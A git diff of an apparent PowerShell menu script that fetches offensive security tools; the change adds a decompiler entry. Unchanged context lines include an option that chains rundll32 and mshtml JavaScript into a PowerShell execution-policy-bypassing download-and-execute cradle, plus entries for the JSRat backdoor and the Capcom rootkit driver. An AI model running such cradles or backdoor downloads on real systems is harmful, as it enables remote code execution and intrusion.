@@ -111,6 +111,8 @@ while($true){
     write-host " 209. ivan-sincek/file-shredder";
     write-host "DCOM";
     write-host " 274. sud0woodo/DCOMrade";
+    write-host "DECOMILER"
+    write-host " 371. icsharpcode/AvaloniaILSpy";
     write-host "DRIVER";
     write-host " 271. FuzzySecurity/Capcom-Rootkit/Driver/Capcom.sys";
     write-host "DUMPING - EXTRACTING";
@@ -619,6 +621,7 @@ while($true){
         '368' {write-host "Digit a remote file to download"; $MIP=read-host "(example, http://10.11.12.13/script.ps1)"; if($MIP -le ""){rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('$MIP');"}}
         '369' {ScaricaSSL "PwnDexter/SharpEDRChecker/1.1" "SharpEDRChecker.exe" "PwnDexter/SharpEDRChecker/releases/download/1.1/SharpEDRChecker.exe"}
         '370' {Scarica "3gstudent/Javascript-Backdoor (real name, JSRat)" "JSRat.ps1" "3gstudent/Javascript-Backdoor/master/JSRat.ps1"}
+        '371' {ScaricaSSL "icsharpcode/AvaloniaILSpy" "ILSpy-win-x64-Release.zip" "icsharpcode/AvaloniaILSpy/releases/download/v5.0-rc2/ILSpy-win-x64-Release.zip"}
         default{write-host 'ERROR: this choice is incorrect'}
     }
     read-host "Press ENTER to continue";
